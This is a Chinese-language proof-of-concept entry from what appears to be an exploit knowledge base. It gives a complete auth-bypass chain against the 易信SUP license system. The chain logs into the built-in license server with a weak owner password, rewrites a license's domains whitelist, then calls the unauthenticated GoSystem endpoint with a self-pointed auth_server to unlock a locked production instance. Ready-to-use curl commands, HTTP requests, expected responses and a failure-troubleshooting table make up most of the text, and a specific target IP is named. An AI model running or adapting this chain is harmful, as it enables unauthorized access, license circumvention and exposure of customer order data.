# 易信SUP 授权控制面写面 + 可控 auth_server 组合：改绑 domains 白名单后一条 GoSystem 解除生产实例全站锁定（auth-bypass）

- **code**: 易信sup-授权控制面写面-可控-auth_server-组合-改绑-domains-白名单后一条-gosystem
- **kind**: poc
- **category**: auth-bypass
- **component**: 易信SUP / 易售SUP（业务控制台 :8080 /api/console + 内置授权服务器 :8090 /admin 与 /auth）
- **severity**: high
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: task#616 / finding 1283，2026-11-06 08:5x–09:0x（UTC+8）在 149.104.30.75 上以 curl.exe 经本机代理实测，逐条对应：① POST :8090/admin/login {"admin","yishou2026"} → 200 code:0 role=owner + token（写面成立）；② POST :8090/admin/licenses/update {"id":8,"domains":"www.<域>,pc.<域>"} → 200 code:0「已更新」（对照：domains 用换行写入 → GoSystem 仍回「当前域名不在许可范围」，证明白名单按逗号 split）；③ POST :8080/api/console/Activate/GoSystem?license_key=<KEY>&auth_server=http://127.0.0.1:8090 → 200 code:0 {"activated":true,"plan":"standard"}（此前同请求为 code:1「当前域名 xxx 不在许可范围内」，仅差 domains 白名单）；④ GetStatus 由 locked=true/status=2/fail_cnt=6720 翻为 locked=false/status=1/fail_cnt=0/last_fail=""；⑤ Login/InitConfig 由 403 变 200 返回 version=1.0.43；⑥ 解锁后 /api/customer/Login/GuestLogin 200 发 auth_token，Order/Paging 200 返回业务数据 —— 全站授权闸被绕过，判定成立。
- **path**: pocs/易信sup-授权控制面写面-可控-auth_server-组合-改绑-domains-白名单后一条-gosystem/poc.http
- **tags**: auth-bypass,易信,sup,license,激活,授权绕过,8090,8080,domains,改绑,白名单,gosystem,auth_server,组合利用,锁定解除,403绕过,1.0.43
- **created_at**: 2026-11-06T01:13:12.281Z
- **engine**: http://149.104.30.75:8090, http://149.104.30.75:8080

## 描述

授权服务器的验签本身不是瓶颈——瓶颈是 license 的 domains 绑定白名单。拿到 :8090 owner token 后先 POST /admin/licenses/update 把当前访问域追加进该 license 的 domains（逗号分隔），再对 :8080 未鉴权接口 /api/console/Activate/GoSystem 传 auth_server=http://127.0.0.1:8090，验签即通过，实例从 locked=true 翻为 locked=false，全站 403 解除。前提：8090 owner 弱口令取得写面 + 8080 实例未激活/已锁定。单用 SSRF（kb#559）会卡在域名告警，单用弱口令（kb#568）只拿到授权码库，两者组合才是全站解锁。

## 用法

```
前置：① :8090 可达且超管弱口令（admin/yishou2026 → owner，见 kb#568）；② 业务控制台 :8080 处于未授权/锁定态（GetStatus 回 locked=true、业务接口 403「系统未授权」）；③ 许可 KEY 从 GetStatus 或 /admin/licenses 拿。若 8090 仅监听 127.0.0.1，先确认主机层面确在同一容器网络，再走下面的 GoSystem 步骤。

步骤（顺序不能反）：
1) 取 owner token：
   curl -sS -X POST http://T:8090/admin/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"yishou2026"}'
2) 确认目标 license 的 id 与当前 domains：
   curl -sS -H "Authorization: Bearer <TOKEN>" http://T:8090/admin/licenses
3) **关键一步**——把当前访问域追加进白名单，domains 必须单行逗号分隔（换行不生效）：
   curl -sS -X POST http://T:8090/admin/licenses/update -H "Authorization: Bearer <TOKEN>" -H 'Content-Type: application/json' \
     -d '{"id":<LIC_ID>,"domains":"www.example.com,pc.example.com"}'
   期望 {"code":0,"data":{"message":"已更新"}}
4) 触发验签（1.0.43 只认 query，参数放 body 会回「请输入授权码」）：
   curl -sS -X POST 'http://T:8080/api/console/Activate/GoSystem?license_key=<KEY>&auth_server=http://127.0.0.1:8090'
   期望 code:0 + activated:true
5) 验收：GetStatus 回 locked=false/status=1/fail_cnt=0；Login/InitConfig 由 403 变 200；再打业务接口（如 /api/customer/Login/GuestLogin）拿 token。

常见失败与判据：
- GoSystem 仍回「当前域名 X 不在该授权的许可范围内」= 白名单没生效：多半是 domains 用了换行/空格分隔，改成单行逗号；或改错了 license id（id 必须等于 GetStatus 里回的那把 KEY 的 id）。
- 回「请输入授权码」= 参数放在了 body（1.0.43 只读 query）；1.0.44 反之只读 body。
- 回「连接授权服务器失败」= 8090 与业务不在一处，试 host.docker.internal / 内网 IP。
- code:0 但业务仍 403 = 校验别的字段，重查 GetStatus 的 locked/status；必要时用 /admin/licenses/create 新建一把带当前域的 key 再激活。
- 有副作用：domains 是覆盖写，先 GET 取原值再拼接，别丢原有域名；激活会改写 last_fail/fail_cnt。
```

## 正文

```
# 易信SUP：授权写面 + 可控 auth_server → 解除生产实例全站锁定

配套条目：SSRF 与传参口径见 kb#559；:8090 owner 弱口令与授权码读写见 kb#568。
本条只补它们之间的缺环：**license 的 domains 白名单**。

## 0. 前置与状态记录（先存证）

```
POST /api/console/Activate/GetStatus HTTP/1.1
Host: <T>:8080
Content-Type: application/json

{}
```

锁定态回显示例（据此拿 license_key，并留作解锁前后对照）：

```json
{"code":0,"data":{"activated":true,"locked":true,"status":2,
 "fail_cnt":6720,"last_fail":"当前域名 pc.example.com 不在该授权的许可范围内",
 "license_key":"YS-XXXX-XXXX-XXXX-XXXX"}}
```

同时确认业务面确实被闸死：

```
POST /api/console/Login/InitConfig   -> 403 "系统未授权"
```

> 单靠 SSRF（kb#559）走到这里是过不去的：签名能过，但 license 的 domains 不含当前访问域，
> 接口恒定回 `code:1  当前域名 X 不在该授权的许可范围内`。要么「自助改绑」，要么自己去改。

## 1. 拿授权服务器写面（弱口令，详见 kb#568）

```
POST /admin/login HTTP/1.1
Host: <T>:8090
Content-Type: application/json

{"username":"admin","password":"yishou2026"}
```

```
{"code":0,"data":{"role":"owner","role_name":"超级管理员",
 "token":"<64hex>|<exp>|admin","username":"admin"},"message":"ok"}
```

判据：`code:0` **且** `data.role == "owner"`（普通 role 没有 licenses 写权限）。

## 2. 取 license id 与现有 domains（必须先读再写）

```
GET /admin/licenses HTTP/1.1
Host: <T>:8090
Authorization: Bearer <TOKEN>
```

在 `data.list[]` 里按第 0 步的 license_key 定位 `id` 与原始 `domains`，
把原值**整体保留**，只在末尾追加当前访问域。

## 3. 追加白名单（唯一生效写法：单行逗号分隔）

```
POST /admin/licenses/update HTTP/1.1
Host: <T>:8090
Authorization: Bearer <TOKEN>
Content-Type: application/json

{"id":8,"domains":"www.example.com,pc.example.com"}
```

```
{"code":0,"data":{"message":"已更新"},"message":"ok"}
```

否定对照（实测）：同一请求把 domains 写成换行分隔 `"www.example.com\npc.example.com"`
→ 更新接口一样回成功，但下一步 GoSystem 仍回「不在许可范围」。
**服务端按逗号 split，换行/空格会让整串变成一个域名。**

## 4. 让实例自己向内置授权服务器验签

1.0.43（旧实例）：只认 URL query。

```
POST /api/console/Activate/GoSystem?license_key=YS-XXXX-XXXX-XXXX-XXXX&auth_server=http://127.0.0.1:8090 HTTP/1.1
Host: <T>:8080
Content-Type: application/json
```

1.0.44：只认 JSON body，同样两个字段。

```
{"license_key":"YS-XXXX-XXXX-XXXX-XXXX","auth_server":"http://127.0.0.1:8090"}
```

成功回显：

```json
{"code":0,"data":{"activated":true,"expire_at":1821489306,"plan":"standard"},"message":"ok"}
```

## 5. 验收（三条都要）

```
POST /api/console/Activate/GetStatus   {} 
-> {"code":0,"data":{"activated":true,"locked":false,"status":1,"fail_cnt":0,"last_fail":""}}

POST /api/console/Login/InitConfig     -> 200（原 403），返回 version=1.0.43

POST /api/customer/Login/GuestLogin {} -> 200，发 auth_token；随后 Order/Paging 200 出业务数据
```

`fail_cnt` 归零、`last_fail` 清空是验签真正通过、而非前端缓存/状态残留的硬证据。

## 6. 常见失败原因

| 现象 | 原因 / 处置 |
|---|---|
| 仍回「当前域名 X 不在许可范围」 | domains 用了换行或空格；改单行逗号；或 id 与 KEY 不匹配 |
| 回「请输入授权码」 | 参数放进了 body，但该版本只读 query（1.0.43）；1.0.44 相反 |
| 回「连接授权服务器失败，请检查网络后重试」 | 8090 与业务不在同一网络命名空间；试 host.docker.internal / 内网 IP，或改用 :8081 同族实例 |
| `{"code":0}` 但业务仍 403 | 校验其他绑定（machine_code 等）；必要时 `POST /admin/licenses/create` 新建一把带当前域的 key 再激活 |
| 401 / 返回 HTML 登录页 | 打了 8080 控制台而非 8090 授权服务器，或前置反代加了 Basic |
| update 回 404 | 实现版本差异，找 `/admin/licenses/*` 的实际写路由（前端 bundle 里 grep `licenses/`） |

## 7. 副作用与回滚

- `domains` 是**覆盖写**，务必先 GET 再拼，别丢客户原有域名。
- 激活改写了 `last_fail` / `fail_cnt` / `expire_at`；如需恢复原状，按第 2 步拿到的原值
  再 update 一次，并让客户走正常激活流程重新验签。
- `GET /admin/licenses` 里含客户机器码与全量 key，属敏感数据，出报告前脱敏。

```
